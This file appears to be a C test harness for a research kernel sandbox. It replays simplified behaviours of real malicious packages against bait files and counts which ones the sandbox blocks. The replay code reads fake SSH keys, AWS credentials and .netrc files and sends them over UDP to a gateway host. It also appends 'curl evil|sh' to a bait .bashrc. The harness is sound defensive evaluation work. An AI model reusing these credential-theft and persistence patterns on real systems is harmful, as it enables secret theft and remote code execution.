/* E3 corpus replay: real malicious packages from the DataDog
 * malicious-software-packages-dataset, replayed as canonical
 * install-time behavior sequences inside capability envelopes
 * (docs/research/10-evaluation.md -- paper-data experiment).
 *
 * Each corpus entry was classified by STATIC analysis on the host
 * (tools/corpus/extract_corpus.py); the guest replays only the
 * canonical syscall-level behavior of its class.  Arms: NONE (attack
 * must succeed, validating replay fidelity) and ENVELOPE with an
 * install-time policy (FILE+PIPE, no SOCKET, op/data budgets).
 * Benign entries replay the real tarball write footprint of popular
 * npm packages with a budget sized from the manifest (2x headroom).
 *
 * Malicious matrix is run REPS times; outcomes must be stable.
 * All expectations green => "ENVELOPE_CORPUS: PASS".
 */
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define SYS_a20_envelope_create 902
#define SYS_a20_envelope_enter  903

struct env_policy {
    unsigned int allowed_types;
    unsigned long long rights_by_class[32];
    unsigned long long time_budget_ns;
    unsigned long long op_budget;
    unsigned long long data_budget;
    unsigned int propagation_types;
    unsigned int flags;
};

#define OBJ_FILE 3
#define OBJ_PIPE 6
#define R_READ  (1ull << 0)
#define R_WRITE (1ull << 1)
#define R_STAT  (1ull << 3)
#define R_SEEK  (1ull << 4)

#define CLS_EXFIL    1
#define CLS_NET_ONLY 2
#define CLS_STAGE2   3
#define CLS_PERSIST  4
#define CLS_RUNAWAY  5
#define CLS_CREDS    6
#define CLS_N        7

#define REPS 3

struct corpus_entry {
    const char *name;
    const char *eco;
    int cls;
};
struct benign_entry {
    const char *name;
    const char *version;
    int n_files;
    int total_bytes;
};
#include "core/envelope_corpus_data.h"

static const char *cls_name[CLS_N] = {
    "?", "exfil", "net-only", "stage2", "persist", "runaway", "creds"
};

static long env_create(struct env_policy *p)
{
    return syscall(SYS_a20_envelope_create, p, 0L);
}

static int env_enter(long id)
{
    return syscall(SYS_a20_envelope_enter, id) < 0 ? -1 : 0;
}

/* Install-time policy a CI operator would attach: filesystem and pipe
 * access with full file rights, no network class, bounded op/data
 * volume. */
static void install_policy(struct env_policy *p)
{
    memset(p, 0, sizeof(*p));
    p->allowed_types = (1u << OBJ_FILE) | (1u << OBJ_PIPE);
    p->rights_by_class[OBJ_FILE] = R_READ | R_WRITE | R_STAT | R_SEEK;
    p->rights_by_class[OBJ_PIPE] = R_READ | R_WRITE | R_STAT;
    p->op_budget = 40;
    p->data_budget = 65536;
}

/* Outbound UDP channel to the QEMU host gateway: the attack-success
 * metric for every network class (fire-and-forget, no listener needed).
 * Returns 0 if the channel was established, 1 if creation was denied. */
static int exfil_channel(const char *payload, int n)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        return 1;
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    dst.sin_addr.s_addr = htonl((10u << 24) | 2u);
    sendto(s, payload, (size_t)n, 0, (struct sockaddr *)&dst, sizeof(dst));
    close(s);
    return 0;
}

static int read_bait(const char *path, char *buf, int n)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    int r = (int)read(fd, buf, (size_t)n);
    close(fd);
    return r;
}

/* Replay one malicious sample's canonical behavior.
 * Returns 0 = attack goal achieved, 1 = blocked, 2 = harness error. */
static int replay_attack(int cls)
{
    char buf[128];
    switch (cls) {
    case CLS_EXFIL: {
        int n = read_bait("/tmp/corpus/home/.ssh/id_rsa", buf, sizeof(buf));
        if (n <= 0)
            n = read_bait("/tmp/corpus/home/.aws/credentials", buf,
                          sizeof(buf));
        if (n <= 0)
            return 2;
        return exfil_channel(buf, n);
    }
    case CLS_NET_ONLY:
        return exfil_channel("beacon", 6);
    case CLS_STAGE2: {
        if (exfil_channel("GET /stage2", 11) != 0)
            return 1;
        int fd = open("/tmp/corpus/build/dl.bin",
                      O_CREAT | O_TRUNC | O_WRONLY, 0755);
        if (fd < 0)
            return 1;
        int ok = write(fd, "PAYLOAD", 7) == 7;
        close(fd);
        return ok ? 0 : 1;
    }
    case CLS_PERSIST: {
        int fd = open("/tmp/corpus/home/.bashrc",
                      O_WRONLY | O_APPEND);
        if (fd < 0)
            return 1;
        int ok = write(fd, "curl evil|sh\n", 13) == 13;
        close(fd);
        return ok ? 0 : 1;
    }
    case CLS_RUNAWAY: {
        int fd = open("/tmp/corpus/build/run.log",
                      O_CREAT | O_TRUNC | O_WRONLY, 0644);
        if (fd < 0)
            return 1;
        int i;
        for (i = 0; i < 60; i++)
            if (write(fd, "x", 1) != 1)
                break;
        close(fd);
        return i == 60 ? 0 : 1;
    }
    default: { /* CLS_CREDS */
        int got = 0;
        got += read_bait("/tmp/corpus/home/.ssh/id_rsa", buf, sizeof(buf)) > 0;
        got += read_bait("/tmp/corpus/home/.aws/credentials", buf,
                         sizeof(buf)) > 0;
        got += read_bait("/tmp/corpus/home/.netrc", buf, sizeof(buf)) > 0;
        return got >= 2 ? 0 : (got == 0 ? 1 : 2);
    }
    }
}

/* Replay one benign package install: untar-equivalent write footprint
 * under the build prefix.  Returns 0 = install completed. */
static int replay_benign(const struct benign_entry *b)
{
    int per = b->total_bytes / (b->n_files > 0 ? b->n_files : 1);
    if (per <= 0)
        per = 1;
    if (per > 4096)
        per = 4096;
    char *blk = malloc((size_t)per);
    if (!blk)
        return 2;
    memset(blk, 'D', (size_t)per);
    char path[128];
    for (int i = 0; i < b->n_files; i++) {
        snprintf(path, sizeof(path), "/tmp/corpus/build/b%03d", i);
        int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0644);
        if (fd < 0) {
            free(blk);
            return 1;
        }
        int ok = write(fd, blk, (size_t)per) == per;
        close(fd);
        if (!ok) {
            free(blk);
            return 1;
        }
    }
    free(blk);
    return 0;
}

static void put_file(const char *path, const char *content)
{
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0644);
    if (fd < 0) {
        fprintf(stderr, "CORPUS fixture %s: %s\n", path, strerror(errno));
        exit(2);
    }
    size_t n = strlen(content);
    if (write(fd, content, n) != (ssize_t)n)
        exit(2);
    close(fd);
}

static void make_fixtures(void)
{
    mkdir("/tmp/corpus", 0755);
    mkdir("/tmp/corpus/home", 0755);
    mkdir("/tmp/corpus/home/.ssh", 0755);
    mkdir("/tmp/corpus/home/.aws", 0755);
    mkdir("/tmp/corpus/build", 0755);
    put_file("/tmp/corpus/home/.ssh/id_rsa", "FAKE-PRIVATE-KEY-BAIT");
    put_file("/tmp/corpus/home/.aws/credentials", "AKIAFAKEBAIT");
    put_file("/tmp/corpus/home/.netrc", "machine bait login x password y");
    put_file("/tmp/corpus/home/.bashrc", "# bait bashrc\n");
}

/* Run one malicious sample under one arm.  arm_env!=0 => envelope. */
static int run_mal_cell(const struct corpus_entry *c, int arm_env)
{
    long id = -1;
    if (arm_env) {
        struct env_policy pol;
        install_policy(&pol);
        id = env_create(&pol);
        if (id < 0)
            return 2;
    }
    pid_t p = fork();
    if (p < 0)
        return 2;
    if (p == 0) {
        if (arm_env && env_enter(id) < 0)
            _exit(2);
        _exit(replay_attack(c->cls));
    }
    int st = 0;
    waitpid(p, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : 2;
}

static int run_benign_cell(const struct benign_entry *b, int arm_env)
{
    long id = -1;
    if (arm_env) {
        struct env_policy pol;
        install_policy(&pol);
        pol.op_budget = 2ull * b->n_files + 16;
        pol.data_budget = 2ull * b->total_bytes + 8192;
        id = env_create(&pol);
        if (id < 0)
            return 2;
    }
    pid_t p = fork();
    if (p < 0)
        return 2;
    if (p == 0) {
        if (arm_env && env_enter(id) < 0)
            _exit(2);
        _exit(replay_benign(b));
    }
    int st = 0;
    waitpid(p, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : 2;
}

int main(void)
{
    printf("ENVELOPE_CORPUS: start malicious=%d benign=%d reps=%d\n",
           CORPUS_N, BENIGN_N, REPS);
    make_fixtures();

    int failures = 0;
    /* per-class tallies: [0]=samples [1]=blocked-under-env */
    int cls_tot[CLS_N] = { 0 }, cls_blk[CLS_N] = { 0 };
    int unstable = 0, fidelity_bad = 0;

    for (int i = 0; i < CORPUS_N; i++) {
        const struct corpus_entry *c = &corpus[i];
        int first_none = -1, first_env = -1, stable = 1;
        for (int r = 0; r < REPS; r++) {
            int rc_none = run_mal_cell(c, 0);
            int rc_env = run_mal_cell(c, 1);
            if (r == 0) {
                first_none = rc_none;
                first_env = rc_env;
            } else if (rc_none != first_none || rc_env != first_env) {
                stable = 0;
            }
        }
        if (!stable)
            unstable++;
        cls_tot[c->cls]++;
        if (first_env == 1)
            cls_blk[c->cls]++;
        /* Fidelity gate: the attack must succeed unprotected. */
        int fidelity_ok = first_none == 0;
        if (!fidelity_ok)
            fidelity_bad++;
        printf("CORPUS: %s/%s cls=%s none=%d env=%d%s\n", c->eco, c->name,
               cls_name[c->cls], first_none, first_env,
               stable ? "" : " UNSTABLE");
        if (!fidelity_ok || !stable) {
            printf("CORPUS-FAIL: %s/%s fidelity/stability\n",
                   c->eco, c->name);
            failures++;
        }
    }

    int benign_fail = 0;
    for (int i = 0; i < BENIGN_N; i++) {
        int rc_none = run_benign_cell(&benign[i], 0);
        int rc_env = run_benign_cell(&benign[i], 1);
        if (rc_none != 0 || rc_env != 0) {
            benign_fail++;
            printf("CORPUS-FAIL: benign %s none=%d env=%d\n",
                   benign[i].name, rc_none, rc_env);
            failures++;
        }
    }

    printf("ENVELOPE_CORPUS: per-class blocked-under-envelope:");
    for (int k = 1; k < CLS_N; k++)
        if (cls_tot[k])
            printf(" %s=%d/%d", cls_name[k], cls_blk[k], cls_tot[k]);
    printf("\n");
    printf("ENVELOPE_CORPUS: benign completed %d/%d, unstable=%d, "
           "fidelity-bad=%d\n",
           BENIGN_N - benign_fail, BENIGN_N, unstable, fidelity_bad);

    /* PASS gate: replay fidelity (all attacks succeed unprotected),
     * outcome stability across reps, and all benign installs complete
     * under the envelope.  Per-class block rates are reported, not
     * gated: persist/creds classes are path-dimension cases outside
     * envelope v1 scope (compose with Landlock), matching the paper. */
    if (failures == 0) {
        printf("ENVELOPE_CORPUS: PASS\n");
        return 0;
    }
    printf("ENVELOPE_CORPUS: FAIL failures=%d\n", failures);
    return 1;
}
